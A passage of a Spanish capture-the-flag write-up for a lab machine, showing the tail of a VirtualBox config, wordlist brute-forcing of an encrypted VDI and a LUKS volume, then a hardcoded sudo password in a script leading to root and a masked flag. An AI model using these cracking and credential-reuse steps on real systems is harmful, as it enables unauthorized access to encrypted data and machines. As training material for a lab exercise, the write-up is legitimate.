+      &lt</span><span class="kd">ExtraDataItem</span><span class="k"> name</span><span class="p">=</span><span class="s2">"GUI/LastNormalWindowPosition"</span><span class="k"> value</span><span class="p">=</span><span class="s2">"0,23,640,480,max"</span><span class="p">/>
+    &lt/</span><span class="kd">ExtraData</span><span class="p">>
+    &lt</span><span class="kd">Hardware</span><span class="p">>
+      &lt</span><span class="kd">CPU</span><span class="k"> count</span><span class="p">=</span><span class="s2">"2"</span><span class="p">>
+        &lt</span><span class="kd">PAE</span><span class="k"> enabled</span><span class="p">=</span><span class="s2">"false"</span><span class="p">/>
+        &lt</span><span class="kd">LongMode</span><span class="k"> enabled</span><span class="p">=</span><span class="s2">"true"</span><span class="p">/>
+        &lt</span><span class="kd">X2APIC</span><span class="k"> enabled</span><span class="p">=</span><span class="s2">"true"</span><span class="p">/>
+        &lt</span><span class="kd">HardwareVirtExLargePages</span><span class="k"> enabled</span><span class="p">=</span><span class="s2">"true"</span><span class="p">/>
+      &lt/</span><span class="kd">CPU</span><span class="p">>
+      &lt</span><span class="kd">Memory</span><span class="k"> RAMSize</span><span class="p">=</span><span class="s2">"2048"</span><span class="p">/>
+      &lt</span><span class="kd">HID</span><span class="k"> Pointing</span><span class="p">=</span><span class="s2">"USBTablet"</span><span class="p">/>
+      &lt</span><span class="kd">Boot</span><span class="p">>
+        &lt</span><span class="kd">Order</span><span class="k"> position</span><span class="p">=</span><span class="s2">"1"</span><span class="k"> device</span><span class="p">=</span><span class="s2">"Floppy"</span><span class="p">/>
+        &lt</span><span class="kd">Order</span><span class="k"> position</span><span class="p">=</span><span class="s2">"2"</span><span class="k"> device</span><span class="p">=</span><span class="s2">"HardDisk"</span><span class="p">/>
+        &lt</span><span class="kd">Order</span><span class="k"> position</span><span class="p">=</span><span class="s2">"3"</span><span class="k"> device</span><span class="p">=</span><span class="s2">"DVD"</span><span class="p">/>
+        &lt</span><span class="kd">Order</span><span class="k"> position</span><span class="p">=</span><span class="s2">"4"</span><span class="k"> device</span><span class="p">=</span><span class="s2">"None"</span><span class="p">/>
+      &lt/</span><span class="kd">Boot</span><span class="p">>
+      &lt</span><span class="kd">Display</span><span class="k"> controller</span><span class="p">=</span><span class="s2">"VMSVGA"</span><span class="k"> VRAMSize</span><span class="p">=</span><span class="s2">"128"</span><span class="k"> accelerate3D</span><span class="p">=</span><span class="s2">"true"</span><span class="p">/>
+      &lt</span><span class="kd">BIOS</span><span class="p">>
+        &lt</span><span class="kd">IOAPIC</span><span class="k"> enabled</span><span class="p">=</span><span class="s2">"true"</span><span class="p">/>
+        &lt</span><span class="kd">SmbiosUuidLittleEndian</span><span class="k"> enabled</span><span class="p">=</span><span class="s2">"true"</span><span class="p">/>
+      &lt/</span><span class="kd">BIOS</span><span class="p">>
+      &lt</span><span class="kd">USB</span><span class="p">>
+        &lt</span><span class="kd">Controllers</span><span class="p">>
+          &lt</span><span class="kd">Controller </span><span class="k">name</span><span class="p">=</span><span class="s2">"OHCI"</span><span class="k"> type</span><span class="p">=</span><span class="s2">"OHCI"</span><span class="p">/>
+          &lt</span><span class="kd">Controller </span><span class="k">name</span><span class="p">=</span><span class="s2">"EHCI"</span><span class="k"> type</span><span class="p">=</span><span class="s2">"EHCI"</span><span class="p">/>
+        &lt/</span><span class="kd">Controllers</span><span class="p">>
+      &lt/</span><span class="kd">USB</span><span class="p">>
+      &lt</span><span class="kd">Network</span><span class="p">>
+        &lt</span><span class="kd">Adapter</span><span class="k"> slot</span><span class="p">=</span><span class="s2">"0"</span><span class="k"> enabled</span><span class="p">=</span><span class="s2">"true"</span><span class="k"> MACAddress</span><span class="p">=</span><span class="s2">"08002799F7EC"</span><span class="k"> type</span><span class="p">=</span><span class="s2">"82540EM"</span><span class="p">>
+          &lt</span><span class="kd">NAT</span><span class="p">/>
+        &lt/</span><span class="kd">Adapter</span><span class="p">>
+      &lt/</span><span class="kd">Network</span><span class="p">>
+      &lt</span><span class="kd">AudioAdapter</span><span class="k"> codec</span><span class="p">=</span><span class="s2">"AD1980" </span><span class="k">driver</span><span class="p">=</span><span class="s2">"DirectSound" </span><span class="k">enabled</span><span class="p">=</span><span class="s2">"true"</span><span class="k"> enabledIn</span><span class="p">=</span><span class="s2">"false"</span><span class="p">/>
+      &lt</span><span class="kd">RTC</span><span class="k"> localOrUTC</span><span class="p">=</span><span class="s2">"UTC"</span><span class="p">/>
+      &lt</span><span class="kd">Clipboard</span><span class="p">/>
+      &lt</span><span class="kd">GuestProperties</span><span class="p">>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestAdd/HostVerLastChecked" </span><span class="k">value</span><span class="p">=</span><span class="s2">"6.1.34"</span><span class="k"> timestamp</span><span class="p">=</span><span class="s2">"1657117437893678100" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestAdd/Revision" </span><span class="k">value</span><span class="p">=</span><span class="s2">"150636"</span><span class="k"> timestamp</span><span class="p">=</span><span class="s2">"1657117380950198406" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestAdd/Version" </span><span class="k">value</span><span class="p">=</span><span class="s2">"6.1.34" </span><span class="k">timestamp</span><span class="p">=</span><span class="s2">"1657117380950198404" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestAdd/VersionExt" </span><span class="k">value</span><span class="p">=</span><span class="s2">"6.1.34" </span><span class="k">timestamp</span><span class="p">=</span><span class="s2">"1657117380950198405" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestInfo/Net/0/MAC" </span><span class="k">value</span><span class="p">=</span><span class="s2">"08002799F7EC" </span><span class="k">timestamp</span><span class="p">=</span><span class="s2">"1657117380952151105" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestInfo/Net/0/Name" </span><span class="k">value</span><span class="p">=</span><span class="s2">"enp0s3"</span><span class="k"> timestamp</span><span class="p">=</span><span class="s2">"1657117380952151107" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestInfo/Net/0/Status" </span><span class="k">value</span><span class="p">=</span><span class="s2">"Up" </span><span class="k">timestamp</span><span class="p">=</span><span class="s2">"1657117380952151106" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestInfo/Net/0/V4/Broadcast" </span><span class="k">value</span><span class="p">=</span><span class="s2">"10.0.2.255" </span><span class="k">timestamp</span><span class="p">=</span><span class="s2">"1657117380952151103" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestInfo/Net/0/V4/IP" </span><span class="k">value</span><span class="p">=</span><span class="s2">"10.0.2.15" </span><span class="k">timestamp</span><span class="p">=</span><span class="s2">"1657117380952151102" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestInfo/Net/0/V4/Netmask" </span><span class="k">value="255.255.255.0" </span><span class="k">timestamp</span><span class="p">=</span><span class="s2">"1657117380952151104" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestInfo/Net/Count" </span><span class="k">value</span><span class="p">=</span><span class="s2">"1"</span><span class="k"> timestamp</span><span class="p">=</span><span class="s2">"1657117646084736900" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestInfo/OS/Product" </span><span class="k">value</span><span class="p">=</span><span class="s2">"Linux" </span><span class="k">timestamp</span><span class="p">=</span><span class="s2">"1657117380950198400" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestInfo/OS/Release" </span><span class="k">value</span><span class="p">=</span><span class="s2">"5.15.0-40-generic" </span><span class="k">timestamp</span><span class="p">=</span><span class="s2">"1657117380950198401" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/GuestInfo/OS/Version" </span><span class="k">value="#43-Ubuntu SMP Wed Jun 15 12:54:21 UTC 2022" </span><span class="k">timestamp</span><span class="p">=</span><span class="s2">"1657117380950198402" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/> 
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/HostInfo/DekMissing" </span><span class="k">value</span><span class="p">=</span><span class="s2">"1"</span><span class="k"> timestamp</span><span class="p">=</span><span class="s2">"1660245560293252500" </span><span class="k">flags</span><span class="p">=</span><span class="s2">"RDONLYGUEST"</span><span class="p">/>
+        &lt</span><span class="kd">GuestProperty </span><span class="k">name</span><span class="p">=</span><span class="s2">"/VirtualBox/HostInfo/GUI/LanguageID" </span><span class="k">value</span><span class="p">=</span><span class="s2">"es_ES" </span><span class="k">timestamp</span><span class="p">=</span><span class="s2">"1660245647071532000" </span><span class="k">flags</span><span class="p">=</span><span class="s2">""</span><span class="p">/>
+      &lt/</span><span class="kd">GuestProperties</span><span class="p">>
+    &lt/</span><span class="kd">Hardware</span><span class="p">>
+    &lt</span><span class="kd">StorageControllers</span><span class="p">>
+      &lt</span><span class="kd">StorageController</span><span class="k"> name</span><span class="p">=</span><span class="s2">"AHCI"</span><span class="k"> type</span><span class="p">=</span><span class="s2">"AHCI"</span><span class="k"> PortCount</span><span class="p">=</span><span class="s2">"3"</span><span class="k"> useHostIOCache</span><span class="p">=</span><span class="s2">"false"</span><span class="k"> Bootable</span><span class="p">=</span><span class="s2">"true"</span><span class="k"> IDE0MasterEmulationPort</span><span class="p">=</span><span class="s2">"0"</span><span class="k"> IDE0SlaveEmulationPort</span><span class="p">=</span><span class="s2">"1"</span><span class="k"> IDE1MasterEmulationPort</span><span class="p">=</span><span class="s2">"2"</span><span class="k"> IDE1SlaveEmulationPort</span><span class="p">=</span><span class="s2">"3"</span><span class="p">>
+        &lt</span><span class="kd">AttachedDevice</span><span class="k"> type</span><span class="p">=</span><span class="s2">"HardDisk"</span><span class="k"> hotpluggable</span><span class="p">=</span><span class="s2">"false"</span><span class="k"> port</span><span class="p">=</span><span class="s2">"0"</span><span class="k"> device</span><span class="p">=</span><span class="s2">"0"</span><span class="p">>
+          &lt</span><span class="kd">Image</span><span class="k"> uuid</span><span class="p">=</span><span class="s2">"{12b147da-5b2d-471f-9e32-a32b1517ff4b}"</span><span class="p">/>
+        &lt/</span><span class="kd">AttachedDevice</span><span class="p">>
+      &lt/</span><span class="kd">StorageController</span><span class="p">>
+    &lt/</span><span class="kd">StorageControllers</span><span class="p">>
+    &lt</span><span class="kd">VideoCapture</span><span class="k"> options</span><span class="p">=</span><span class="s2">"vc_enabled=true,ac_enabled=true,ac_profile=med"</span><span class="k"> fps</span><span class="p">=</span><span class="s2">"25"</span><span class="p">/>
+  &lt/</span><span class="kd">Machine</span><span class="p">>
+&lt/</span><span class="kd">VirtualBox</span><span class="p">></span>
+</code></pre></div></div>
+
+<div><p>El vdi tiene un cifrado podemos usar pyvboxdie-cracker para conseguir la contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> pyvboxdie-cracker.py -v 2019-08-01.vbox -d wordlist.txt
+Starting pyvboxdie-cracker...
+
+[*] Encrypted drive found :  F:/2019.vdi
+[*] KeyStore information...
+ Algorithm = AES-XTS256-PLAIN64
+ Hash = PBKDF2-SHA256
+ Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f
+
+[*] Starting bruteforce...
+ 51 password tested...
+
+[*] Password Found = </span><span class="kd">computer</span>
+</code></pre></div></div>
+
+<div><p>Para lo que sigue recordar tener instalado el extension pack de virtualbox</p></div>
+<div><p><img src="./8.png"><p></div>
+
+<div><p>Una vez instalamos ubuntu y agregamos el vdi hay que habilitar el cifrado que vimos antes</p></div>
+<div><p><img src="./9.png"><p></div>
+
+<div><p>Al intentar montarlo en /dev/shm obtenemos un error de tipo crypto_LUKS</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">ubuntu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo mount /dev/sda /dev/shm
+mount: /dev/shm: unknown filesystem type 'crypto_LUKS'
+</span><span class="s2">ubuntu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos ayudarnos de una a <a href="https://github.com/Diverto/cryptsetup-pwguess/releases">herramienta</a> para obtener la contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">ubuntu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ ./bruteforce-luks-static-linux-amd64 -f wordlist.txt /dev/sda
+Password found: abc123
+</span><span class="s2">ubuntu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Una vez montado encontraremos varios scripts, entre ellos distro_update.sh con una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">echo </span><span class="s2">""
+</span><span class="k">echo </span><span class="s2">"Installing updates.."
+</span><span class="p">passwd</span><span class="kd">=</span><span class="s2">'$_THE_best_Sysadmin_Ever_'</span><span class="p">
+</span><span class="k">echo</span><span class="p"> $passwd</span><span class="kd">|</span><span class="p">sudo apt-get update
+
+</span><span class="k">echo </span><span class="s2">"Upgrading..."</span><span class="p">
+</span><span class="k">echo </span><span class="p">$passwd</span><span class="kd">|</span><span class="p">sudo apt-get -y upgrade</span>
+</code></pre></div></div>
+
+<div><p>Esta contraseña es la del usuario john, el cual tiene ALL a nivel de sudoers</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">john@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+[sudo] password for john: </span><span class="kd">$_THE_best_Sysadmin_Ever_</span><span class="p">
+Matching Defaults entries for john on moderators:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/bin\:/bin
+
+User john may run the following commands on moderators:
+    (root) ALL
+</span><span class="s2">john@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Entonces simplemente hacemos sudo su y nos convertimos el root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">john@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo su
+</span><span class="s2">root@moderators</span><span class="p">:</span><span class="na">/home/john</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@moderators</span><span class="p">:</span><span class="na">/home/john</span><span class="p"># hostname -I
+10.10.11.173 dead:beef::250:56ff:feb9:4a96
+</span><span class="s2">root@moderators</span><span class="p">:</span><span class="na">/home/john</span><span class="p"># cd /root
+</span><span class="s2">root@moderators</span><span class="p">:</span><span class="na">~</span><span class="p"># cat root.txt
+c66**************************b24
+</span><span class="s2">root@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
